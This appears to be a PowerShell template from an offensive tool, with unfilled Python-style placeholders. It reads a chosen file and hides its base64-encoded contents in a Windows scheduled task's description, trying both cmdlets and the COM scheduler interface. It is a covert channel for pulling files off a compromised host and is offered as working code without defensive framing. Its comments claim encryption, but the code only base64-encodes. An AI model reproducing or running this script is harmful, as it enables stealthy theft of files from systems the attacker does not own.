$target_file = "REPLACE_FILE_PATH"
$encryptionKey = [System.Convert]::FromBase64String("{key_b64}")
{common_ps}
function DownloadByPs($taskname){{
    $task = Get-ScheduledTask -TaskName $taskname -TaskPath \;
    # Check if file exists
    if (Test-Path -Path $target_file) {{
        try {{
            # Read file content and encrypt it, then save it to task description
            # Check if file is larger than 1MB
            $fileInfo = Get-Item $target_file
            if ($fileInfo.Length -gt 1048576) {{
                $result = "[-] File is too large."
            }}else{{
                $result = Get-Content -Path $target_file -Encoding Byte
            }}
        }} catch {{
            $result = $_.Exception.Message
        }}
    }}else{{
        $result = "[-] File not exists."
    }}
    $b64result = ConvertTo-Base64 $result
    $task.Description = $b64result
    Set-ScheduledTask $task
}}
function DownloadByCom($taskname){{
    $taskPath = "\"
    $scheduler = New-Object -ComObject Schedule.Service
    $scheduler.Connect()
    try {{
        $folder = $scheduler.GetFolder($taskPath)
        $result = ""
        $task = $folder.GetTask($taskname)
        $definition = $task.Definition
        # Check if file exists
        if (Test-Path -Path $target_file) {{
            try {{
                # Read file content and encrypt it, then save it to task description
                # Check if file is larger than 1MB
                $fileInfo = Get-Item $target_file
                if ($fileInfo.Length -gt 1048576) {{
                    $result = "[-] File is too large."
                }}else{{
                    $result = Get-Content -Path $target_file -Encoding Byte
                }}
            }} catch {{
                $result = $_.Exception.Message
            }}
        }}else{{
            $result = "[-] File not exists."
        }}
        $b64result = ConvertTo-Base64 $result
        $definition.RegistrationInfo.Description = $b64result
        $user = $task.Principal.UserId
        $folder.RegisterTaskDefinition($task.Name, $definition, 6, $user, $null, $task.Definition.Principal.LogonType)
    }}catch {{
        Write-Error "Failed.."
    }}
    finally {{
        [System.Runtime.InteropServices.Marshal]::ReleaseComObject($scheduler) | Out-Null
    }}
}}
$taskname = "{taskname}"
try {{
    DownloadByPs($taskname)
}}catch{{
    DownloadByCom($taskname)
}}
[Environment]::Exit(0)